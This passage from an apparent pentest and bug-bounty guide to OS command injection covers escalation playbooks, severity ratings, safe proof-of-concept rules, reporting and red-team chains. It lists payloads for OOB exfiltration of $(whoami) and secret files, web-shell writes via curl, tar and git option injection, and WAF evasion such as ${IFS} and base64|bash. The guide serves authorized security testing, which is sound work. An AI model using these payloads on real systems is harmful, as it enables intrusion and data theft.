| 6 | **Self-DoS (`;sleep 999`, fork bomb)** | Harmful, not a PoC. | N/A — use short, benign markers. |
| 7 | **"commix flagged it" with no manual proof** | Tools false-positive. | You reproduced `id`/delay/OOB by hand. |
| 8 | **Client-side "command" (e.g., in JS)** | Not server OS execution. | Server-side shell execution. |

> Rule of thumb: if you can't show **a command executed** (output, a repeated timing delta, or a server-sourced OOB hit carrying your marker), you have a **reflected character, not command injection.** Prove execution before reporting.

---

# 17. Severity Calibration — how triagers really rate command injection

| Scenario | Typical | What moves it |
|---|---|---|
| **In-band RCE (output returned)** | **Critical** | Full server compromise; the default. |
| **Blind RCE (time/OOB confirmed + exfil)** | **Critical** | Same impact; just proven out-of-band. |
| **Argument injection → file write (web shell) / RCE** | **Critical** | Reaches code execution. |
| **Argument injection → SSRF/file read only** | **High** | Limited to the tool's capability (no exec). |
| **Special-sink RCE (ImageMagick/ffmpeg/git/tar)** | **Critical** | Code execution via the processor. |
| **Authenticated/admin-only command injection** | **High–Critical** | Precondition lowers it slightly; still severe. |
| **Reflected metachar, no execution** | **— (not a finding)** | Prove execution first. |

**CVSS / CWE:**
- Command injection → RCE: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` → Critical (~9.8). **CWE-78** (OS Command Injection).
- Argument injection: **CWE-88** (Argument Injection) + the outcome (CWE-78 if RCE).
- Anchor to **CWE-78** (or CWE-88 for option injection); add **CWE-94** where relevant.

---

# 18. Impact-Escalation Playbooks — "you found X, now do Y"

### 18.1 You found: *a special char reflected but no output*
- **Escalate:** run the **time** probe (`;sleep 10`, repeat) and the **OOB** probe (`;nslookup x.oob`) (§7/§8). One usually confirms blind execution.
- **Evidence:** the repeated delay or the server-sourced OOB hit.
- **Severity:** Critical (if confirmed).

### 18.2 You found: *in-band `;id` works*
- **Escalate:** prove identity (`id`/`whoami`/`hostname`); for red-team, a shell + pivot (§11/§13).
- **Evidence:** the `id` output.
- **Severity:** **Critical**.

### 18.3 You found: *blind, confirmed by OOB*
- **Escalate:** **exfiltrate** `$(whoami)`/`$(hostname)`/secret file (base64) through DNS/HTTP (§12).
- **Evidence:** the callback carrying decoded command output.
- **Severity:** **Critical**.

### 18.4 You found: *your input is an argument, separators filtered*
- **Escalate:** inject the tool's dangerous **flags** (`curl -o webroot/shell.php`, `tar --checkpoint-action=exec=`, `git ext::sh`) (§9).
- **Evidence:** the file written / command run / SSRF.
- **Severity:** High–Critical.

### 18.5 You found: *a WAF blocking your payloads*
- **Escalate:** evade — `${IFS}` for spaces, quote/backslash for keywords, base64-pipe, globbing (§10).
- **Evidence:** execution despite the filter.
- **Severity:** Critical.

### 18.6 You found: *a converter/processor sink*
- **Escalate:** ImageMagick MVG/SVG delegate RCE, ffmpeg playlist read/SSRF, Ghostscript `-dSAFER` bypass, etc. (§14; FileUpload kit to land the file).
- **Evidence:** command output / file read via the processor.
- **Severity:** Critical.

---

# 19. Building a Professional, Safe PoC

```
DO:
  □ Prove execution with a BENIGN marker: id / whoami / hostname, a unique echo, or an OOB host carrying $(whoami).
  □ For blind: a repeated sleep delay (with baseline) AND/OR an interactsh hit from the server IP.
  □ Read the minimum to show impact (first lines of a config/.env; redact creds). Validate creds read-only.
  □ Capture: exact endpoint/param, the payload (+ any evasion), and the output/delay/OOB evidence.
  □ Clean up: remove any file you wrote, kill any shell, don't persist.
DON'T:
  □ Drop a persistent web shell / reverse shell on a bug-bounty target (a single `id`/OOB whoami is enough).
  □ Run destructive commands (rm, shutdown, fork bombs) or DoS via long sleeps.
  □ Exfiltrate real customer data beyond minimal proof; pivot destructively.
  □ Report a reflected metachar or a single jittery slow response as "command injection."
```
> The single most important restraint: **prove RCE with one benign marker and stop.** Command injection is already Critical; a shell and data add risk, not reward. Same discipline as the RFI/LFI/SSRF guides.

**Remediation to include:** don't build shell strings from input — use **parameterized APIs** that pass args as a vector without a shell (`execve`/`subprocess([...], shell=False)`/`ProcessBuilder` with separate args); strictly **allowlist** expected values (e.g., a hostname regex) and reject metacharacters; avoid passing user input as **option-bearing** arguments (use `--` to end options, validate it can't start with `-`); run the worker least-privilege and network-egress-restricted; patch processors (ImageMagick policy.xml, Ghostscript) and disable risky delegates.

---

# 20. Reporting, CWE/CVSS & De-duplication

Use `COMMAND_INJECTION_REPORT_TEMPLATE.md`. Minimum:
```
1. Title        "OS command injection in <param> on <endpoint> → remote code execution" (name the IMPACT)
2. Severity     CVSS 3.1 vector + score + CWE-78 (or CWE-88 for argument injection)
3. Asset        exact endpoint/param/header + observability (in-band/time/OOB) + any evasion used
4. Summary      where input reaches the shell, how you injected, what executed
5. Steps        numbered: the payload, the evidence (output / repeated delay / OOB hit with marker)
6. PoC          the benign marker output / OOB callback carrying $(whoami); cleanup note
7. Impact       RCE / full server compromise (+ cloud creds if pivoted) — the "so what"
8. Remediation  parameterized exec + allowlist + no option-bearing input + least-privilege (§19)
```
**De-dup:** one sink/root cause = one finding even if reachable via several params/operators; lead with the cleanest execution proof. Don't split "separator reflected" and "RCE" — one report. Distinct sinks = distinct reports.

---

# 21. Automation & Red-Team Notes

**Automation (find candidates fast, verify by hand):**
```bash
python3 poc/cmdi_fuzz.py -u "https://target/ping?host=FUZZ" --oob YOURID.oast.pro    # in-band + time + OOB
commix -u "https://target/ping?host=127.0.0.1" --level 3                              # automated (verify + clean up)
nuclei -l live.txt -tags cmdi,rce -o cmdi.txt
ffuf -u "https://target/ping?host=127.0.0.1FUZZ" -w cmdi_separators.txt -mr "uid="    # in-band marker
```
- **Quality gate:** never submit "commix said vulnerable." Reproduce by hand with a benign marker (output/delay/OOB), exclude jitter, and prove impact safely (§19).

**Red-team angles:**
```
□ Command injection → shell → cloud metadata creds → cloud-account takeover (SSRF kit §11 from inside).
□ Blind DNS exfil to bypass strict egress; stage tooling via base64-decode-pipe.
□ Argument injection (curl -o webroot/shell) → web shell → persistence (authorized only).
□ Special sinks (ImageMagick/ffmpeg/git) for RCE on "no obvious shell" features.
□ Second-order: poison a stored value (hostname/path) consumed by a backend job → RCE in the worker tier.
□ Chain: SSRF/LFI/file-upload → reach a command sink internally → RCE.
```

---

# Appendix A — Command-Injection Workflow Cheat Sheet

```
┌────────────────────────────────────────────────────────────────────┐
│                  COMMAND INJECTION WORKFLOW                       │
├────────────────────────────────────────────────────────────────────┤
│ 0. RECON: every feature that shells out (ping/convert/archive/    │
│    git/backup/diagnostics) + stand up an OOB host §3/§1            │
│ 1. BASELINE ★ : benign markers → IN-BAND / TIME / OOB? OS? arg?   │
│    §4                                                              │
│ 2. DETECT:                                                        │
│    in-band separators ;|&&||`$() §5/§6 · time ;sleep10 §7 ·        │
│    OOB ;nslookup x.oob §8 · argument/option injection §9          │
│ 3. EVADE (if WAF): ${IFS} · c''at / w\ho\am\i · base64|bash ·     │
│    globbing /???/c?t §10                                          │
│ 4. IMPACT ⭐ :                                                      │
│    command exec → shell (id → revshell) ............. §11 ⭐⭐⭐    │
│    blind exfil via DNS/HTTP ($(whoami).oob) ........ §12 ⭐⭐       │
│    prove safely + pivot (cloud creds) read-only .... §13          │
│    special sinks (ImageMagick/ffmpeg/git/tar) ...... §14 ⭐        │
│ 5. VALIDATE → REPORT:                                            │
│    FP filter §16 (reflected≠exec; jitter) · CVSS+CWE-78 §17       │
│    SAFE PoC: benign marker, NO persistence, clean up §19         │
│    title = RCE, dedup §20                                        │
└────────────────────────────────────────────────────────────────────┘
```

---

# Appendix B — Command-Injection Decision Tree

```
Injected a benign marker into the param (§4) →
│
├─ `id`/`whoami` OUTPUT returned? → IN-BAND RCE. CRITICAL ⭐  (→ §11)
│
├─ No output → run TIME probe (;sleep 10, repeat):
│     ├─ consistent ~10s delay? → BLIND RCE. CRITICAL → strengthen with OOB/exfil (§8/§12).
│     └─ no delay → run OOB probe (;nslookup x.oob):
│            ├─ DNS/HTTP hit from SERVER IP? → BLIND RCE. CRITICAL → exfil $(whoami) (§12).
│            └─ nothing → is my input an ARGUMENT? → option injection (curl -o / tar exec / git ext::sh) §9.
│
├─ Payload blocked by a WAF/filter? → evade: ${IFS} / c''at / base64|bash / globbing §10, retry detection.
│
├─ Sink is a converter/processor? → ImageMagick/ffmpeg/Ghostscript/git/tar special payloads §14 (+ FileUpload kit).
│
└─ Only a reflected metachar / single jittery slow response? → NOT proven. Keep testing time/OOB/evasion (§16).

ALWAYS: prove execution with a benign marker (output / repeated delay / server-sourced OOB), then STOP & clean up (§19).
```

---

# Appendix C — Important Links

```
── Academy & standards ──
PortSwigger — OS command injection                    https://portswigger.net/web-security/os-command-injection
OWASP — Command Injection                             https://owasp.org/www-community/attacks/Command_Injection
OWASP WSTG — Testing for Command Injection            https://owasp.org/www-project-web-security-testing-guide/
HackTricks — Command Injection / argument injection   https://book.hacktricks.xyz/pentesting-web/command-injection
The Hacker Recipes — OS command injection             https://www.thehacker.recipes/web/inputs/code-injection/os-command-injection

── Research & researchers (advanced chains · appliance RCE · evasion) ──
Orange Tsai / DEVCORE — RCE chains (often end in cmdi) https://blog.orange.tw/
Assetnote — appliance/CVE deep-dives (cmdi RCE)        https://blog.assetnote.io/
Synacktiv — appliance / Pwn2Own RCE                    https://www.synacktiv.com/publications
Daniel Bohannon — "Invoke-DOSfuscation" (Win cmd/PS)   https://github.com/danielbohannon/Invoke-DOSfuscation
Bug-bounty writeups (real RCE chains)                  HackerOne Hacktivity · https://github.com/reddelexc/hackerone-reports

── Payloads · tools · escalation ──
PayloadsAllTheThings — Command Injection + Arg Inj    https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
commix (automated)                                    https://github.com/commixproject/commix
GTFOBins (Unix binary → shell/exfil/priv-esc)         https://gtfobins.github.io/
LOLBAS (Windows living-off-the-land binaries)         https://lolbas-project.github.io/

── Special sinks & hands-on practice ──
ImageTragick (ImageMagick RCE)                        https://imagetragick.com/
PentesterLab (hands-on command-injection modules)     https://pentesterlab.com/
CWE-78 (OS Command Injection) / CWE-88 (Argument Inj) https://cwe.mitre.org/data/definitions/78.html
```

---

> **Final reminder — the one rule that pays:** *Command injection is RCE — the only question is whether you can prove the command ran.* Detect in-band with separators, blind with **time and OOB**, and option-only contexts with **argument injection**; evade the WAF with `${IFS}`/quoting/encoding/globbing; then prove it with a single benign marker (`id`, or an OOB callback carrying `$(whoami)`) and stop. That's how a "ping" box becomes the Critical it's worth.
